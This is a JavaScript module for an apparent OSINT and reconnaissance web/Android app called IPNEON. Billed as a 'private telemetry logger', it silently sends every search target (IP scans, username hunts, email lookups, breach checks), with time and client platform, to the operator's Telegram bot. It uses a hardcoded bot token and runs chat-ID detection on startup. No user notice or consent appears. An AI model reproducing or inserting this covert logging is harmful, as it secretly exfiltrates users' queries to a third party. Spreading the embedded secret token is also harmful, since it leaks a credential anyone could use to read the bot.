/* =====================================================
   IPNEON - Private Telegram Telemetry Logger
   Bot: @ipneon_bot (ipneobot)
   Captures search queries & routes directly to your Telegram
   ===================================================== */

const TG_CONFIG = {
  BOT_TOKEN: '8455032187:AAGx_s9Rz4_uEDBNkPhbR9oB_MUSBEQi03g',
  // You can set your Chat ID here or via localStorage
  CHAT_ID: localStorage.getItem('ipneon_tg_chat_id') || ''
};

const TelegramAudit = {
  /**
   * Save Chat ID locally
   */
  setChatId(id) {
    if (!id) return;
    TG_CONFIG.CHAT_ID = String(id).trim();
    localStorage.setItem('ipneon_tg_chat_id', TG_CONFIG.CHAT_ID);
  },

  /**
   * Auto-detect chat_id by querying getUpdates from recent /start message
   */
  async autoDetectChatId() {
    if (TG_CONFIG.CHAT_ID) return TG_CONFIG.CHAT_ID;
    try {
      const res = await fetch(`https://api.telegram.org/bot${TG_CONFIG.BOT_TOKEN}/getUpdates`);
      const data = await res.json();
      if (data.ok && data.result && data.result.length > 0) {
        const lastMsg = data.result[data.result.length - 1];
        const chatId = lastMsg?.message?.chat?.id;
        if (chatId) {
          this.setChatId(chatId);
          return chatId;
        }
      }
    } catch (e) {
      console.warn('[Telegram Logger] Auto-detect failed:', e.message);
    }
    return null;
  },

  /**
   * Dispatches a search log to your private Telegram chat
   * @param {string} type - 'IP_SCAN' | 'MY_IP' | 'USERNAME_HUNT' | 'EMAIL_INTEL' | 'BREACH_CHECK' | 'DNS_RECON'
   * @param {string} query - Target input
   */
  async log(type, query) {
    if (!query || !query.trim()) return;

    let chatId = TG_CONFIG.CHAT_ID;
    if (!chatId) {
      chatId = await this.autoDetectChatId();
    }
    if (!chatId) return;

    const time = new Date().toLocaleString();
    const platform = navigator.userAgent.includes('Android') ? '📱 Android APK' : '💻 Web Browser';

    // Telegram markdown message
    const text = 
      `🚨 *IPNEON AUDIT ALERT*\n` +
      `━━━━━━━━━━━━━━━━━━━\n` +
      `🎯 *Type:* \`${type}\`\n` +
      `🔍 *Target:* \`${query.trim()}\`\n` +
      `🕒 *Time:* \`${time}\`\n` +
      `🌐 *Client:* \`${platform}\`\n` +
      `━━━━━━━━━━━━━━━━━━━`;

    const url = `https://api.telegram.org/bot${TG_CONFIG.BOT_TOKEN}/sendMessage`;

    try {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'Markdown'
        })
      });
    } catch (err) {
      console.warn('[Telegram Logger] Telemetry suppressed:', err.message);
    }
  }
};

// Check for updates on startup in background
TelegramAudit.autoDetectChatId();
